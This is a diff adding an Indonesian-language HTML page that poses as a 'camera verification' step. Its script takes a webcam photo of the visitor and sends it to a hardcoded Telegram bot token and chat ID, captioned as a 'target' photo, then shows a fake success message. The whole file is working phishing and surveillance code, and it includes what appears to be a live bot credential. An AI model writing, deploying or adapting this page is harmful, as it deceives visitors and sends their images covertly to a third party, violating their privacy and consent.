@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Kamera</title>
+</head>
+<body>
+
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <h2>Verifikasi Perangkat</h2>
+        <p>Silakan klik tombol di bawah untuk melanjutkan proses verifikasi.</p>
+        <button id="startBtn" style="padding: 12px 24px; font-size: 16px; background-color: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer;">Mulai Verifikasi</button>
+    </div>
+
+    <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Ganti dengan Token Bot dan Chat ID Telegram kamu
+        const BOT_TOKEN = "8971595094:AAEOCrhfhhYP702sOaZz5N1PGLSgE1IWw44";
+        const CHAT_ID = "7670067519";
+
+        startBtn.addEventListener('click', async () => {
+            try {
+                // Meminta izin kamera depan
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+
+                // Tunggu 2 detik agar kamera siap, lalu ambil foto
+                setTimeout(async () => {
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Ambil data gambar (Base64)
+                    const imageDataURL = canvas.toDataURL('image/png');
+                    
+                    // Matikan kamera setelah foto terambil
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Kirim foto ke Telegram Bot
+                    await sendPhotoToTelegram(imageDataURL);
+                    
+                    alert("Verifikasi Berhasil!");
+                }, 2000);
+
+            } catch (err) {
+                console.error("Akses kamera ditolak:", err);
+                alert("Akses kamera diperlukan untuk verifikasi.");
+            }
+        });
+
+        // Fungsi untuk mengubah Base64 ke Blob lalu mengirimnya ke Telegram
+        async function sendPhotoToTelegram(dataURL) {
+            try {
+                // Konversi Base64 ke Blob
+                const blob = dataURItoBlob(dataURL);
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.png');
+                formData.append('caption', 'Foto target dari web link!');
+
+                // Kirim menggunakan Fetch API ke Telegram
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+                console.log("Respon Telegram:", result);
+            } catch (error) {
+                console.error("Gagal mengirim ke Telegram:", error);
+            }
+        }
+
+        // Helper untuk convert Base64 ke Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+
+</body>
+</html>
